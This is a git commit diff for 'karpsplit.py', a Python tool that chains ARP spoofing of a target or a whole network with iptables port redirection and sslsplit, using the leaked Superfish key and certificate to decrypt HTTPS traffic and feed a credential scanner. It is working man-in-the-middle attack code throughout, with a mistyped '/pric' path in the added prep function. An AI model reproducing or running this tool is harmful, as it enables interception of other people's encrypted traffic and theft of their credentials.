cb15fa41cc65ce58a459ca730c5000cc6965729b
Kyle Ramey <codefusion1@gmail.com>
2016-02-28 01:50:21 -0400

    created prep function

--- karpsplit.py
+++ karpsplit.py
@@ -1,9 +1,16 @@
-import subprocess
-from subprocess import PIPE
+from subprocess import Popen, PIPE
 import netifaces
 import re
 import time
 import sys
+
+
+def prep():
+    f = open("/pric/sys/net/ipv4/ip_forward", 'w')
+    print("1", file=f)
+    f.close()
+    Popen(["iptables", "-t", "NAT", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "8080"])
+    Popen(["iptables", "-t", "NAT", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "443", "-j", "REDIRECT", "--to-port", "8443"])
 
 
 def arpspoof(target = None):
@@ -12,14 +19,14 @@ def arpspoof(target = None):
     print("Found gateway " + gateway)
     interface = "eth0"
     if target is None:
-        spoofer = subprocess.Popen(["arpspoof", "-i", interface, gateway], stdout=PIPE)
+        spoofer = Popen(["arpspoof", "-i", interface, gateway])
     else:
-        spoofer = subprocess.Popen(["arpspoof", "-i", interface, "-t", target, gateway], stdout=PIPE)
+        spoofer = Popen(["arpspoof", "-i", interface, "-t", target, gateway])
     return spoofer
 
 
 def sslsplit():
-    splitter = subprocess.Popen(["sslsplit", "-k", "/root/superfishy-master/certificates/superfish-unprotected.key", "-c", "/root/superfishy-master/certificates/superfish.crt", "-L", "/dev/stdout", "ssl", "0.0.0.0", "8443"], stdout=PIPE)
+    splitter = Popen(["sslsplit", "-k", "/root/superfishy-master/certificates/superfish-unprotected.key", "-c", "/root/superfishy-master/certificates/superfish.crt", "-L", "/dev/stdout", "ssl", "0.0.0.0", "8443"], stdout=PIPE)
     return splitter
 
 
@@ -53,16 +60,23 @@ def read_output(pipe):
             time.sleep(2)
 
 
-print("KARPSplit v0.1\n")
+print("\nKARPSplit v0.1\n")
+
+print("Preparing OS... ", end="")
+prep()
+print("Done")
 if len(sys.argv) > 1:
-    print("Starting ARP Spoof on " + sys.argv[1] + "...")
+    print("Starting ARP Spoof on " + sys.argv[1] + "... ", end="")
     arpspoof(sys.argv[1])
+    print("Done")
 else:
-    print("Starting ARP Spoof on all devices...")
+    print("Starting ARP Spoof on all devices... ", end="")
     arpspoof()
+    print("Done")
 time.sleep(1)
-print("Starting SSLSplit...")
+print("Starting SSLSplit... ", end="")
 splitter = sslsplit()
+print("Done")
 time.sleep(1)
 print("Starting credential scanner...")
 read_output(splitter.stdout)
